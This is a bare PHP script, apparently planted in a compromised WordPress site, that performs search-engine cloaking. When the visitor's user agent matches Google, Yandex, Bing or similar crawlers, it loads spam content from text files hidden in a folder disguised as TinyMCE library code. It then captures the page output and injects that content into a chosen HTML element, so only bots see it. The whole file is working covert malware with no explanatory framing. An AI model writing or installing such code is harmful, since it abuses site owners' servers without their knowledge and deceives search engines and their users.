<?php
$path = 'wp-includes/js/tinymce/utils/js';
$url = ($_SERVER['REQUEST_URI'] == '/' || $_SERVER['REQUEST_URI'] == '/index.php') ? '/index' : '/' . crc32($_SERVER['REQUEST_URI']);
//file_put_contents($path . '/' . $url . '.txt', '');
$bots = array('google', 'yandex', 'bing', 'GeccoBot');
if (file_exists($path . $url . '.txt') && strpos_array($_SERVER['HTTP_USER_AGENT'], $bots) !== false) {
	
	$data_content = file_get_contents($path . $url . '.txt');
	preg_match("#\[BLOCK\](.+)\[/BLOCK\]#iUs", $data_content, $blok);
	preg_match("#\[CONTENT\](.+)\[/CONTENT\]#iUs", $data_content, $content_1);
	ob_start();
	register_shutdown_function('load_core');
}


function load_core() {
	global $path; global $url; global $blok; global $content_1;
	$block_array = explode(':', $blok[1]);
	$tag = $block_array[0];
	$ind = (stripos($block_array[1], '#') !== false) ? 'id="' . str_replace('#', '', $block_array[1]) . '"' : 'class="' . str_replace('.', '', $block_array[1]) . '"';
	$my_content = ob_get_contents();
	ob_end_clean();
	$correct_content = str_replace('$', '\$', $content_1[1]);
	$my_content = preg_replace("#<$tag(.*)$ind(.*)>(.+)</$tag>#iUs", "<$tag$1$ind$2>$3 $correct_content</$tag>", $my_content, 1);
	echo $my_content;
}

function strpos_array($haystack, $needle) {
    if(!is_array($needle)) {
        if($pos = stripos($haystack, $needle) !== false) return $pos;
    } else {
        for($i = 0; $i < count($needle); $i++) {
            if($pos = stripos($haystack, $needle[$i]) !== false) return $pos;
        }
    }
    return false;
}